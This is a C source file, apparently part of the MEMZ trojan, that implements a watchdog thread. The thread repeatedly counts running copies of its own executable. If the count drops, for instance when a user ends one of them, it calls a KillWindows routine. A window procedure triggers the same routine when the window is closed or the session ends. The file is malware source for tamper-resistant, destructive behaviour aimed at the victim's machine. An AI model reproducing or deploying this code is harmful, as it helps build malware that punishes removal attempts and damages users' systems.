#include "MEMZ.h"

// WatchDogThread
DWORD WINAPI WatchDogThread(LPVOID lpParameter) {
	int oProc = 0;

	wchar_t *pifn = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 0x200);
	GetProcessImageFileName(GetCurrentProcess(), pifn, 0x200);

	Sleep(2048);

	for (;;) {
		HANDLE Snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		PROCESSENTRY32 Proc;
		Proc.dwSize = sizeof(PROCESSENTRY32);

		Process32First(Snapshot, &Proc);

		int nProc = 0;
		while (Process32Next(Snapshot, &Proc)) {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, Proc.th32ProcessID);
			wchar_t *pifn2 = (wchar_t *)LocalAlloc(LMEM_ZEROINIT, 0x200);
			GetProcessImageFileName(hProc, pifn2, 0x200);

			if (!lstrcmp(pifn, pifn2)) {
				nProc++;
			}

			CloseHandle(hProc);
			LocalFree(pifn2);
		}

		CloseHandle(Snapshot);

		if (nProc < oProc) {
			KillWindows();
		}

		oProc = nProc;

		Sleep(512);
	}
}

// WindowProc for WatchDogThread
LRESULT CALLBACK WindowProc(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
	if (uMsg == WM_CLOSE || uMsg == WM_ENDSESSION) {
		KillWindows();
		return 0;
	}

	return DefWindowProc(hWnd, uMsg, wParam, lParam);
}